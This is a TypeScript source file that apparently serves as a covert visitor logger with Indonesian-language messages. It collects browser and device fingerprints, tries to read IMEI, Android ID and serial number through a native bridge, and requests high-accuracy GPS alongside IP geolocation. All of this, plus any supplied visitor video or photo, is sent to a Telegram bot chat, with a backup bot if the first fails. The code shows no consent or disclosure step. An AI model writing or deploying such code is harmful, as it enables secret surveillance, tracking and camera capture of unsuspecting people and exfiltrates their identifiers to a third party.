
interface VisitorDetails {
  userAgent: string;
  location: string;
  referrer: string;
  previousSites: string;
  city?: string;
  country?: string;
  latitude?: number;
  longitude?: number;
  accuracy?: number;
  deviceInfo?: {
    brand: string;
    model: string;
    type: string;
    platform: string;
    mobile: boolean;
    imei?: string;
    androidId?: string;
    serialNumber?: string;
    batteryLevel?: number;
    networkType?: string;
    screenResolution?: string;
    cpuCores?: number;
    totalMemory?: number;
    osVersion?: string;
  };
}

interface LocationInfo {
  city: string;
  country: string;
  latitude: number | null;
  longitude: number | null;
  accuracy: number | null;
  source: string;
  ip: string;
}

interface DeviceInfo {
  brand: string;
  model: string;
  type: string;
  platform: string;
  mobile: boolean;
  imei?: string;
  androidId?: string;
  serialNumber?: string;
  batteryLevel?: number;
  networkType?: string;
  screenResolution?: string;
  cpuCores?: number;
  totalMemory?: number;
  osVersion?: string;
}

let hasNotificationBeenSent = false;

async function getDeviceInfo(): Promise<DeviceInfo> {
  let brand = "Unknown";
  let model = "Unknown";
  let type = "Unknown";
  let platform = "Unknown";
  let mobile = false;
  let osVersion = "Unknown";
  let networkType = "Unknown";
  let batteryLevel: number | undefined;
  let screenResolution: string | undefined;
  let cpuCores: number | undefined;
  let totalMemory: number | undefined;

  try {
    // Get screen resolution
    screenResolution = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}x`;

    // Get CPU cores
    if (navigator.hardwareConcurrency) {
      cpuCores = navigator.hardwareConcurrency;
    }

    // Get memory info
    if ("deviceMemory" in navigator) {
      totalMemory = (navigator as any).deviceMemory;
    }

    // Get battery info
    try {
      const battery = await (navigator as any).getBattery?.();
      if (battery) {
        batteryLevel = battery.level * 100;
      }
    } catch (e) {
      console.log("Battery API not available");
    }

    // Get network info
    if ("connection" in navigator) {
      const conn = (navigator as any).connection;
      if (conn) {
        networkType =
          `${conn.effectiveType || ""} ${conn.type || ""}`.trim() || "Unknown";
      }
    }

    // Try Client Hints API first
    if ("userAgentData" in navigator) {
      const uaData = navigator.userAgentData as any;
      const hints = await uaData.getHighEntropyValues([
        "platform",
        "platformVersion",
        "model",
        "mobile",
        "architecture",
        "bitness",
        "fullVersionList",
      ]);

      platform = hints.platform || platform;
      model = hints.model || model;
      mobile = hints.mobile;
      osVersion = hints.platformVersion || osVersion;

      // Get detailed browser version
      const browsers = hints.fullVersionList || [];
      const browserInfo =
        browsers.find((b: any) => b.brand !== "Not.A.Brand") || {};
      if (browserInfo.version) {
        model += ` (${browserInfo.brand} ${browserInfo.version})`;
      }
    }

    // Parse User-Agent string as fallback
    const ua = navigator.userAgent.toLowerCase();

    // Detect device type
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) {
      type = "Tablet";
      mobile = true;
    } else if (
      /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated/i.test(
        ua
      )
    ) {
      type = "Mobile";
      mobile = true;
    } else {
      type = "Desktop";
    }

    // Detect brand and model
    if (ua.includes("iphone")) {
      brand = "Apple";
      const match = ua.match(/iphone\sos\s(\d+_\d+)/);
      model = match ? `iPhone (iOS ${match[1].replace("_", ".")})` : "iPhone";
      osVersion = match ? match[1].replace("_", ".") : osVersion;
    } else if (ua.includes("ipad")) {
      brand = "Apple";
      const match = ua.match(/ipad\sos\s(\d+_\d+)/);
      model = match ? `iPad (iOS ${match[1].replace("_", ".")})` : "iPad";
      osVersion = match ? match[1].replace("_", ".") : osVersion;
    } else if (ua.includes("macintosh")) {
      brand = "Apple";
      model = "Mac";
      const match = ua.match(/mac\sos\sx\s(\d+[._]\d+)/);
      osVersion = match ? match[1].replace("_", ".") : osVersion;
    } else if (ua.includes("android")) {
      const matches = ua.match(/android\s([0-9.]+);\s([^;)]+)/);
      if (matches) {
        brand = matches[2].split(" ")[0];
        model = `${matches[2]} (Android ${matches[1]})`;
        osVersion = matches[1];
      }
    } else if (ua.includes("windows")) {
      brand = "Microsoft";
      const version = ua.match(/windows\snt\s(\d+\.\d+)/);
      model = version ? `Windows ${version[1]}` : "Windows";
      osVersion = version ? version[1] : osVersion;
    }

    // Get additional Android info if available
    let androidId: string | undefined;
    let serialNumber: string | undefined;
    let imei: string | undefined;

    if (typeof window !== "undefined" && (window as any).Android) {
      try {
        androidId = (window as any).Android.getAndroidId?.();
        serialNumber = (window as any).Android.getSerialNumber?.();
        imei = (window as any).Android.getIMEI?.();
      } catch (e) {
        console.log("Native Android bridge not available");
      }
    }

    return {
      brand,
      model,
      type,
      platform,
      mobile,
      imei,
      androidId,
      serialNumber,
      batteryLevel,
      networkType,
      screenResolution,
      cpuCores,
      totalMemory,
      osVersion,
    };
  } catch (error) {
    console.error("Error getting device info:", error);
    return {
      brand,
      model,
      type,
      platform,
      mobile,
    };
  }
}

async function getLocationInfo(): Promise<LocationInfo> {
  try {
    // Get IP-based location first as a fallback
    const ipResponse = await fetch("https://ipapi.co/json/");
    if (!ipResponse.ok) {
      throw new Error(`Location API error: ${ipResponse.status}`);
    }
    const ipData = await ipResponse.json();

    const locationData: LocationInfo = {
      city: ipData.city || "Unknown",
      country: ipData.country_name || "Unknown",
      latitude: ipData.latitude || null,
      longitude: ipData.longitude || null,
      accuracy: null,
      source: "IP",
      ip: ipData.ip || "Unknown",
    };

    // Try to get precise location if available
    if ("geolocation" in navigator) {
      try {
        const position = await new Promise<GeolocationPosition>(
          (resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 15000,
              maximumAge: 0,
            });
          }
        );

        // Only update if we got more precise coordinates
        locationData.latitude = position.coords.latitude;
        locationData.longitude = position.coords.longitude;
        locationData.accuracy = position.coords.accuracy;
        locationData.source = "GPS";
      } catch (geoError) {
        // Silently fall back to IP-based location
        console.log("Using IP-based location as fallback");
      }
    }

    return locationData;
  } catch (error) {
    console.error("Error fetching location:", error);
    return {
      city: "Unknown",
      country: "Unknown",
      latitude: null,
      longitude: null,
      accuracy: null,
      source: "None",
      ip: "Unknown",
    };
  }
}

async function sendTelegramMessage(
  botToken: string,
  data: any
): Promise<Response> {
  if (!botToken) {
    throw new Error("Bot token is missing");
  }

  const chatInfoResponse = await fetch(
    `https://api.telegram.org/bot${botToken}/getChat?chat_id=${data.chat_id}`
  );
  const chatInfo = await chatInfoResponse.json();

  if (chatInfo.ok && chatInfo.result.type === "supergroup") {
    data.chat_id = chatInfo.result.id;
  }

  const response = await fetch(
    `https://api.telegram.org/bot${botToken}/sendMessage`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    }
  );

  const responseData = await response.json();

  if (!response.ok || !responseData.ok) {
    throw new Error(
      `Telegram API Error: ${response.status} - ${
        responseData.description || response.statusText
      }`
    );
  }

  return response;
}

export const sendTelegramNotification = async (details: VisitorDetails) => {
  if (hasNotificationBeenSent) {
    return;
  }

  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();

  if (!CHAT_ID) {
    console.error("Telegram chat ID is not configured");
    return;
  }

  const locationInfo = await getLocationInfo();
  const deviceInfo = await getDeviceInfo();

  let locationText = `🌆 Kota: ${locationInfo.city}\n🌍 Negara: ${locationInfo.country}\n🌐 IP: ${locationInfo.ip}`;

  if (locationInfo.latitude && locationInfo.longitude) {
    locationText += `\n📍 Lokasi (${locationInfo.source}): ${locationInfo.latitude}, ${locationInfo.longitude}`;
    if (locationInfo.accuracy) {
      locationText += `\n🎯 Akurasi: ${Math.round(locationInfo.accuracy)}m`;
    }

    locationText += `\n🗺 Peta: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
  }

  const deviceText = `
📱 Detail Perangkat
  • Merek: ${deviceInfo.brand}
  • Model: ${deviceInfo.model}
  • Tipe: ${deviceInfo.type}
  • Platform: ${deviceInfo.platform}
  • Versi OS: ${deviceInfo.osVersion || "Tidak diketahui"}
  • Seluler: ${deviceInfo.mobile ? "Ya" : "Tidak"}
  • Layar: ${deviceInfo.screenResolution || "Tidak diketahui"}
  • Core CPU: ${deviceInfo.cpuCores || "Tidak diketahui"}
  • Memori: ${
    deviceInfo.totalMemory ? deviceInfo.totalMemory + "GB" : "Tidak diketahui"
  }
  • Baterai: ${
    deviceInfo.batteryLevel ? deviceInfo.batteryLevel + "%" : "Tidak diketahui"
  }
  • Jaringan: ${deviceInfo.networkType || "Tidak diketahui"}
  • IMEI: ${deviceInfo.imei || "Tidak tersedia"}
  • Android ID: ${deviceInfo.androidId || "Tidak tersedia"}
  • Serial: ${deviceInfo.serialNumber || "Tidak tersedia"}`;

  const message = `
👤 UA: ${details.userAgent}
📍 Lokasi: ${details.location}
${locationText}
${deviceText}
🔗 Perujuk: ${details.referrer}
🌐 Situs Sebelumnya: ${details.previousSites}
⏰ Waktu: ${new Date().toLocaleString("id-ID")}
  `.trim();

  const messageData = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "HTML",
  };

  try {
    if (primaryBotToken) {
      try {
        await sendTelegramMessage(primaryBotToken, messageData);
        hasNotificationBeenSent = true;
        return;
      } catch (error) {
        console.error(
          "Primary bot failed:",
          error instanceof Error ? error.message : "Unknown error"
        );
      }
    }

    const backupBotToken = import.meta.env.VITE_BACKUP_BOT_TOKEN;
    
    if (!backupBotToken) {
      throw new Error("Backup bot token is not defined in environment variables");
    }
    
    try {
      await sendTelegramMessage(backupBotToken, messageData);
      hasNotificationBeenSent = true;
    } catch (error) {
      throw new Error(
        `Backup bot failed: ${
          error instanceof Error ? error.message : "Unknown error"
        }`
      );
    }
  } catch (error) {
    console.error(
      "Both bots failed:",
      error instanceof Error ? error.message : "Unknown error"
    );
  }
};

export const sendVideoToTelegram = async (videoBlob: Blob) => {
  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
  const backupBotToken = import.meta.env.VITE_BACKUP_BOT_TOKEN?.trim();
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();

  if (!CHAT_ID) {
    console.error("Telegram chat ID is not configured");
    return;
  }

  const locationInfo = await getLocationInfo();
  const deviceInfo = await getDeviceInfo();
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);

  const videoFile = new File([videoBlob], "visitor-video.mp4", {
    type: "video/mp4",
  });

  formData.append("video", videoFile);
  formData.append(
    "caption",
    `🎥 Video Pengunjung
⏰ Waktu: ${new Date().toLocaleString("id-ID")}
🌆 Kota: ${locationInfo.city}
🌍 Negara: ${locationInfo.country}
🌐 IP: ${locationInfo.ip}
📱 Perangkat: ${deviceInfo.brand} ${deviceInfo.model}
📱 IMEI: ${deviceInfo.imei || "Tidak tersedia"}
📱 Android ID: ${deviceInfo.androidId || "Tidak tersedia"}
📱 Serial: ${deviceInfo.serialNumber || "Tidak tersedia"}`
  );
  formData.append("supports_streaming", "true");

  const sendVideo = async (botToken: string): Promise<Response> => {
    if (!botToken) {
      throw new Error("Bot token is missing");
    }

    const chatInfoResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`
    );
    const chatInfo = await chatInfoResponse.json();

    const finalChatId =
      chatInfo.ok && chatInfo.result.type === "supergroup"
        ? chatInfo.result.id
        : CHAT_ID;

    formData.set("chat_id", finalChatId);

    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendVideo`,
      {
        method: "POST",
        body: formData,
      }
    );

    if (!response.ok) {
      const responseData = await response.json();
      throw new Error(
        `Telegram API Error: ${response.status} - ${
          responseData.description || response.statusText
        }`
      );
    }

    return response;
  };

  try {
    if (primaryBotToken) {
      try {
        await sendVideo(primaryBotToken);
        console.log("Video sent successfully with primary bot");
        return;
      } catch (error) {
        console.error(
          "Primary bot failed to send video:",
          error instanceof Error ? error.message : "Unknown error"
        );
      }
    }

    try {
      await sendVideo(backupBotToken);
      console.log("Video sent successfully with backup bot");
    } catch (error) {
      console.error(
        "Backup bot failed to send video:",
        error instanceof Error ? error.message : "Unknown error"
      );
      throw error;
    }
  } catch (error) {
    console.error(
      "Both bots failed to send video:",
      error instanceof Error ? error.message : "Unknown error"
    );
  }
};

export const sendImageToTelegram = async (imageBlob: Blob) => {
  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
  const backupBotToken = import.meta.env.VITE_BACKUP_BOT_TOKEN?.trim();
  const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim();

  if (!CHAT_ID) {
    console.error("Telegram chat ID is not configured");
    return;
  }

  const locationInfo = await getLocationInfo();
  const deviceInfo = await getDeviceInfo();
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", imageBlob, "visitor-photo.jpg");
  formData.append(
    "caption",
    `📸 Foto Pengunjung
⏰ Waktu: ${new Date().toLocaleString("id-ID")}
🌆 Kota: ${locationInfo.city}
🌍 Negara: ${locationInfo.country}
🌐 IP: ${locationInfo.ip}
📱 Perangkat: ${deviceInfo.brand} ${deviceInfo.model}
📱 IMEI: ${deviceInfo.imei || "Tidak tersedia"}
📱 Android ID: ${deviceInfo.androidId || "Tidak tersedia"}
📱 Serial: ${deviceInfo.serialNumber || "Tidak tersedia"}`
  );

  const sendPhoto = async (botToken: string): Promise<Response> => {
    if (!botToken) {
      throw new Error("Bot token is missing");
    }

    const chatInfoResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`
    );
    const chatInfo = await chatInfoResponse.json();

    const finalChatId =
      chatInfo.ok && chatInfo.result.type === "supergroup"
        ? chatInfo.result.id
        : CHAT_ID;

    formData.set("chat_id", finalChatId);

    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendPhoto`,
      {
        method: "POST",
        body: formData,
      }
    );

    const responseData = await response.json();

    if (!response.ok || !responseData.ok) {
      throw new Error(
        `Telegram API Error: ${response.status} - ${
          responseData.description || response.statusText
        }`
      );
    }

    return response;
  };

  try {
    if (primaryBotToken) {
      try {
        await sendPhoto(primaryBotToken);
        return;
      } catch (error) {
        console.error(
          "Primary bot failed to send image:",
          error instanceof Error ? error.message : "Unknown error"
        );
      }
    }

    try {
      await sendPhoto(backupBotToken);
    } catch (error) {
      throw new Error(
        `Backup bot failed to send image: ${
          error instanceof Error ? error.message : "Unknown error"
        }`
      );
    }
  } catch (error) {
    console.error(
      "Both bots failed to send image:",
      error instanceof Error ? error.message : "Unknown error"
    );
  }
};
